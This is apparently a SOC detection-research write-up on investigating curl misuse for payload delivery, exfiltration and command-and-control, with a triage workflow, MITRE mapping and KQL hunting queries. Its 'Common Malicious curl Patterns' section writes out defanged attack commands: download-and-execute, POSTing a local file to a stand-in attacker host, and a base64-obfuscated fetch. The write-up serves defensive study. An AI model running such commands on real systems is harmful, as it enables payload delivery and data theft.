# Detection Research: Suspicious `curl` Behavior in Endpoint Environments

A SOC analyst methodology project examining how legitimate command-line utilities like `curl` are abused by attackers for payload delivery, data exfiltration, and command-and-control (C2), and how to investigate and detect this behavior in an enterprise environment.

> This write-up documents an investigation **methodology and detection logic**, illustrated with synthetic/generic command examples. No real organizational data or live malicious infrastructure is referenced.

---

## Table of Contents
- [Overview](#overview)
- [Why curl Is a LOLBin Risk](#why-curl-is-a-lolbin-risk)
- [Investigation Workflow](#investigation-workflow)
- [Step 1: Initial Alert Triage](#step-1-initial-alert-triage)
- [Step 2: Process Tree Analysis](#step-2-process-tree-analysis)
- [Step 3: Command-Line Argument Analysis](#step-3-command-line-argument-analysis)
- [Step 4: Network Destination & Traffic Analysis](#step-4-network-destination--traffic-analysis)
- [Step 5: File System Impact](#step-5-file-system-impact)
- [Step 6: Distinguishing Malicious vs. Legitimate Use](#step-6-distinguishing-malicious-vs-legitimate-use)
- [Step 7: IOC Extraction](#step-7-ioc-extraction)
- [Step 8: Disposition & Escalation](#step-8-disposition--escalation)
- [Step 9: Detection Engineering Follow-Up](#step-9-detection-engineering-follow-up)
- [Common Malicious curl Patterns](#common-malicious-curl-patterns)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Tools Used](#tools-used)
- [Analyst Checklist](#analyst-checklist)
- [References](#references)

---

## Overview

`curl` is a legitimate, pre-installed command-line utility for transferring data to and from a server, present by default on Linux, macOS, and modern Windows builds. Because it's trusted, signed, and administratively useful, attackers frequently use it as a **Living-off-the-Land Binary (LOLBin)** to download second-stage payloads, exfiltrate data, or communicate with C2 infrastructure — all while blending into normal administrative traffic.

This project documents a structured process for investigating a `curl`-related alert, distinguishing genuine malicious use from legitimate administrative activity, and building durable detection logic from confirmed cases.

---

## Why curl Is a LOLBin Risk

- **It's already on the box** — no need for the attacker to drop a new binary, which avoids triggering file-based antivirus/EDR signatures.
- **It's trusted and signed** — security tools are far less likely to block it outright compared to an unsigned, unknown executable.
- **It's flexible** — supports file download, file upload, custom headers, proxy routing, and even basic data exfiltration via POST requests, all from a single command.
- **It's cross-platform** — the same investigative logic and attacker technique applies whether the host is Windows, Linux, or macOS.

---

## Investigation Workflow

```
Alert Triggered (EDR / SIEM / Threat Hunt)
        │
        ▼
Step 1: Initial Alert Triage
        │
        ▼
Step 2: Process Tree Analysis (what spawned curl?)
        │
        ▼
Step 3: Command-Line Argument Analysis
        │
        ▼
Step 4: Network Destination & Traffic Analysis
        │   (DNS logs → firewall/proxy → PCAP/Wireshark)
        │
        ▼
Step 5: File System Impact (what did it download/write?)
        │
        ▼
Step 6: Malicious vs. Legitimate Determination
        │
        ▼
Step 7: IOC Extraction
        │
        ▼
Step 8: Disposition & Escalation
        │
        ▼
Step 9: Detection Tuning
```

---

## Step 1: Initial Alert Triage

Capture the basics before deep-diving:

- **Alert source** — EDR behavioral detection (e.g. Defender for Endpoint), SIEM correlation rule, or proactive threat hunt
- **Host context** — server vs. workstation, and whether this host normally runs automation/scripts that legitimately use curl (e.g. a CI/CD server, a monitoring box)
- **User context** — was this run interactively by a logged-in user, or executed non-interactively (scheduled task, service account, script)?
- **Time of execution** — during business hours vs. off-hours; off-hours execution on a workstation is a stronger anomaly signal

---

## Step 2: Process Tree Analysis

The parent process matters as much as the curl command itself.

**Low-suspicion parents:**
- A known deployment/automation tool (Ansible, Jenkins agent, scheduled task with a documented purpose)
- A terminal session tied to a known administrator's interactive login

**High-suspicion parents:**
- `curl` spawned from **Microsoft Office applications** (Word, Excel spawning `cmd.exe` or `powershell.exe`, which then spawns `curl`) — a classic macro-delivered payload pattern
- `curl` spawned from a **browser process** — potential drive-by or malicious script execution
- `curl` spawned from **another script interpreter** (`wscript.exe`, `mshta.exe`, `powershell.exe`) with no clear administrative justification
- `curl` spawned by a process running from an **unusual path** (e.g. `%TEMP%`, `%APPDATA%`, `/tmp`)

---

## Step 3: Command-Line Argument Analysis

Specific flags dramatically change the risk profile of a curl execution:

| Flag | Purpose | Why It Matters |
|---|---|---|
| `-o` / `--output` | Saves response to a file | Legitimate download **or** payload staging — check the destination path and file type |
| `-O` | Saves file using remote filename | Same risk as above, plus the filename itself is attacker-controlled |
| `-s` / `--silent` | Suppresses progress output | Common in scripts, but also used to hide activity from a user watching the terminal |
| `-k` / `--insecure` | Skips TLS certificate validation | Legitimate in some internal-cert scenarios, but also used to avoid failures when reaching attacker infrastructure with self-signed/invalid certs |
| `-X POST` with data flags (`-d`, `--data`) | Sends data to a remote server | Potential data exfiltration vector — inspect what data is being sent |
| `-H` (custom headers, e.g. fake `User-Agent`) | Header manipulation | Used to blend traffic in with expected application traffic or evade basic filtering |
| Base64-encoded arguments | Obfuscated URL or payload | Strong evasion indicator — always decode and inspect |

**Rule of thumb:** a single suspicious flag rarely confirms malice; the combination (unusual parent + silent download + execution of the downloaded file) is what elevates confidence.

---

## Step 4: Network Destination & Traffic Analysis

Command-line analysis tells you *what was run*; network analysis tells you *what actually happened on the wire*. Both are needed for a complete investigation.

### 4a. Destination Reputation

- **Domain age and reputation** — newly registered domains are a strong signal; check via WHOIS and threat intel feeds
- **Free/dynamic DNS providers** — legitimate infrastructure rarely uses these; frequently abused for disposable C2 hosting
- **Raw IP address instead of a domain** — often used to avoid DNS-based detections and takedowns
- **Non-standard ports** — HTTP/HTTPS traffic on unusual ports can indicate an attempt to blend in with or evade specific firewall rules
- **Geolocation mismatch** — a destination in a region with no business relationship to the organization, though this is supporting evidence only, not conclusive alone

### 4b. DNS Log Analysis

- **Query the DNS logs** for the resolved domain — was this the host's *first-ever* lookup for that domain, or an established pattern? A first-seen query immediately preceding the curl execution is a strong correlating signal.
- **Check for DNS tunneling indicators** if no direct curl-to-IP connection is visible — unusually long subdomains, high query volume to a single parent domain, or TXT/NULL record queries can indicate data is leaving via DNS itself rather than the curl connection.
- **Fast-flux patterns** — a domain resolving to many different IPs in a short window is a common C2 resilience technique.

### 4c. Firewall / Proxy Log Correlation

- **Confirm the connection actually left the network** — command-line evidence shows *intent*; firewall/proxy logs show *outcome*. A curl command that was blocked outbound is a very different case than one that succeeded.
- **Bytes transferred** — a large outbound byte count on what should be a small request (e.g. a config file check-in) can indicate exfiltration rather than simple beaconing.
- **Repeated connection intervals (beaconing)** — regular, evenly-spaced connection attempts to the same destination (e.g. every 60 seconds) are a classic C2 heartbeat pattern, distinct from the irregular timing of normal human/browser-driven traffic.
- **User-Agent string anomalies** — proxy logs often capture the User-Agent header; a curl connection spoofing a browser User-Agent (via `-H "User-Agent: ..."`) is attempting to blend into normal web traffic and is itself a red flag.

### 4d. Packet-Level Analysis (Wireshark / PCAP)

When a packet capture is available (or can be captured live during an active investigation):

- **Filter to the host and destination IP/port** in question: `ip.addr == <host_ip> && ip.addr == <dest_ip>`
- **Inspect the TLS handshake (if HTTPS)** — check the certificate presented by the destination (self-signed, mismatched CN, very recent issue date are all red flags) using Wireshark's `tls.handshake.type == 11` (Certificate) filter.
- **JA3/JA3S fingerprinting** — the TLS client hello's cipher suite ordering produces a fingerprint (JA3) that can identify the specific tool/library used to make the connection (e.g. a raw curl/OpenSSL fingerprint looks very different from a real browser's), even over encrypted traffic.
- **HTTP request/response inspection (if plaintext)** — for non-TLS traffic, Wireshark's `Follow HTTP Stream` reveals the full request/response body, useful for confirming exfiltrated data content or downloaded payload structure.
- **Payload size and timing consistency** — repeated, identically-sized packets at fixed intervals reinforce the beaconing pattern seen in proxy logs.

### 4e. Network-Layer IOCs to Capture

| IOC Type | Field |
|---|---|
| Resolved IP address(es) | `[extracted]` |
| Destination port | `[extracted]` |
| JA3/JA3S hash (if TLS) | `[extracted]` |
| Bytes sent / received | `[extracted]` |
| Connection interval (if beaconing) | `[extracted]` |
| Certificate issuer/CN (if TLS) | `[extracted]` |

---

## Step 5: File System Impact

If curl downloaded a file, follow it:

- **What file type was downloaded?** An `.exe`, `.dll`, `.ps1`, or `.sh` file downloaded via curl and then executed is a near-complete attack chain on its own
- **Where was it written?** Temp directories, user profile folders, or startup locations are all higher risk than an expected application data path
- **Was it executed immediately after download?** Look for a subsequent process creation event referencing the exact downloaded file path within seconds of the curl command completing
- **Persistence check** — did the downloaded file get referenced in a scheduled task, registry Run key, or cron job afterward?

---

## Step 6: Distinguishing Malicious vs. Legitimate Use

| Signal | Leans Legitimate | Leans Malicious |
|---|---|---|
| Parent process | Known automation tool, admin shell | Office app, script interpreter, browser |
| Execution context | Scheduled task, documented script | Interactive, unexpected timing |
| Destination | Known vendor/internal domain | New/unknown domain, raw IP, dynamic DNS |
| Output handling | Predictable file type/location | Executable saved to temp/user folder |
| Post-download activity | None, or expected app behavior | Immediate execution of the downloaded file |
| Obfuscation | None | Base64-encoded URL/arguments, silent flags stacked together |

---

## Step 7: IOC Extraction

| IOC Type | Field |
|---|---|
| Full curl command line | `[extracted]` |
| Destination domain/IP | `[extracted]` |
| Downloaded file name/path | `[extracted]` |
| Downloaded file hash | `[SHA256]` |
| Parent process | `[extracted]` |
| Host/user affected | `[extracted]` |

Submit domain/IP/hash to threat intel (VirusTotal, internal blocklist) and pivot to search for the same command pattern across other hosts in the environment.

---

## Step 8: Disposition & Escalation

| Disposition | Criteria | Action |
|---|---|---|
| **Benign** | Known automation source, expected destination, no execution of downloaded content | Close, document as known-good pattern for future tuning |
| **Suspicious** | Unclear parent/purpose, but no confirmed malicious download or execution | Monitor host, request context from user/system owner |
| **Malicious / Confirmed** | Unusual parent process + suspicious destination + downloaded file executed | Isolate endpoint, collect full IOC set, search environment-wide for the same pattern, initiate full incident response lifecycle |

---

## Step 9: Detection Engineering Follow-Up

**Microsoft Sentinel / Defender Advanced Hunting — curl spawned by an unusual parent process:**

```kql
DeviceProcessEvents
| where FileName =~ "curl.exe"
| where InitiatingProcessFileName in~ ("winword.exe", "excel.exe", "powershell.exe", "wscript.exe", "mshta.exe", "cmd.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine
```

**Microsoft Sentinel / Defender Advanced Hunting — curl downloading an executable followed by its execution:**

```kql
DeviceProcessEvents
| where FileName =~ "curl.exe"
| where ProcessCommandLine has_any (".exe", ".dll", ".ps1", ".sh")
| join kind=inner (
    DeviceProcessEvents
    | where InitiatingProcessFileName =~ "curl.exe" or ProcessCommandLine has "curl"
) on DeviceId
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
```

**Microsoft Sentinel / Defender Advanced Hunting — curl with insecure/silent flags to a raw IP destination:**

```kql
DeviceProcessEvents
| where FileName =~ "curl.exe"
| where ProcessCommandLine has_any ("-k", "--insecure", "-s", "--silent")
| where ProcessCommandLine matches regex @"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
```

**Microsoft Sentinel (KQL) — Beaconing pattern: repeated connections to the same destination at regular intervals:**

```kql
DeviceNetworkEvents
| where InitiatingProcessFileName =~ "curl.exe"
| summarize ConnectionCount = count(), Timestamps = make_list(Timestamp) by DeviceName, RemoteIP, RemoteUrl
| where ConnectionCount > 10
| extend AvgIntervalSeconds = (datetime_diff('second', tolong(Timestamps[ConnectionCount-1]), tolong(Timestamps[0]))) / ConnectionCount
| project DeviceName, RemoteIP, RemoteUrl, ConnectionCount, AvgIntervalSeconds
```

**Microsoft Sentinel (KQL) — DNS query immediately preceding curl execution (first-seen domain correlation):**

```kql
let CurlEvents = DeviceProcessEvents
| where FileName =~ "curl.exe"
| project Timestamp, DeviceId, DeviceName, ProcessCommandLine;
DeviceEvents
| where ActionType == "DnsQuery"
| join kind=inner CurlEvents on DeviceId
| where (Timestamp - Timestamp1) between (0s .. 30s)
| project Timestamp, DeviceName, RemoteUrl = AdditionalFields, ProcessCommandLine
```

> These queries are starting points — tune the parent-process allow-list, connection-count thresholds, and destination logic against your own environment's legitimate automation to control false positives before enabling as production alerts.

---

## Common Malicious curl Patterns

**1. Payload staging (download-and-execute):**
```
curl -s -o C:\Users\Public\update.exe hxxp://malicious-domain[.]com/payload && update.exe
```
*Silent download to a public-writable path, immediately executed.*

**2. Data exfiltration via POST:**
```
curl -X POST -d @sensitive_file.txt hxxp://attacker-c2[.]com/upload
```
*Reads a local file and sends its contents to a remote server.*

**3. Obfuscated download URL:**
```
curl $(echo aHR0cDovL21hbGljaW91cy1kb21haW4uY29t | base64 -d)
```
*Base64-decodes the actual URL at runtime to evade static string-matching detections.*

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Command and Control | Ingress Tool Transfer | T1105 |
| Defense Evasion | Living off the Land (System Binary Proxy Execution) | T1218 |
| Exfiltration | Exfiltration Over C2 Channel | T1041 |
| Defense Evasion | Obfuscated Files or Information | T1027 |
| Command and Control | Application Layer Protocol (Web Protocols) | T1071.001 |
| Command and Control | Non-Standard Port | T1571 |
| Command and Control | Dynamic Resolution (Fast Flux) | T1568.001 |

---

## Tools Used

- Microsoft Sentinel — KQL detection and historical correlation
- Microsoft Defender for Endpoint — Advanced Hunting and process tree visualization
- [VirusTotal](https://www.virustotal.com) — domain/IP/hash reputation checks
- [CyberChef](https://gchq.github.io/CyberChef/) — decoding obfuscated command-line arguments (e.g. base64)
- WHOIS lookup tools — domain age and registrar checks
- **Wireshark** — packet-level inspection, TLS certificate review, JA3/JA3S fingerprinting, HTTP stream reconstruction
- Firewall / proxy logs (e.g. next-gen firewall, web proxy) — connection outcome, bytes transferred, User-Agent inspection
- DNS query logs — first-seen domain correlation, tunneling/fast-flux detection

---

## Analyst Checklist

- [ ] Full command line captured and reviewed (not summarized/truncated)
- [ ] Parent process identified and evaluated against known-legitimate patterns
- [ ] User/host context reviewed (interactive vs. scheduled, business hours vs. off-hours)
- [ ] All command-line flags reviewed for exfiltration/evasion indicators
- [ ] Destination domain/IP checked against threat intel and WHOIS
- [ ] DNS logs reviewed for first-seen domain query and tunneling/fast-flux indicators
- [ ] Firewall/proxy logs checked to confirm whether the connection actually succeeded outbound
- [ ] Connection timing reviewed for beaconing (regular intervals to the same destination)
- [ ] PCAP reviewed if available — TLS certificate, JA3 fingerprint, or HTTP stream content inspected
- [ ] Any downloaded file identified, hashed, and checked for reputation
- [ ] Post-download execution checked (was the file run?)
- [ ] Persistence mechanisms checked if execution occurred
- [ ] Full IOC set documented and submitted to threat intel
- [ ] Environment-wide search performed for the same command pattern
- [ ] Detection rule created/tuned if this represents a new or previously-missed pattern

---

## References

- MITRE ATT&CK — [T1105: Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
- MITRE ATT&CK — [T1218: System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/)
- [LOLBAS Project](https://lolbas-project.github.io/) — living-off-the-land binaries reference
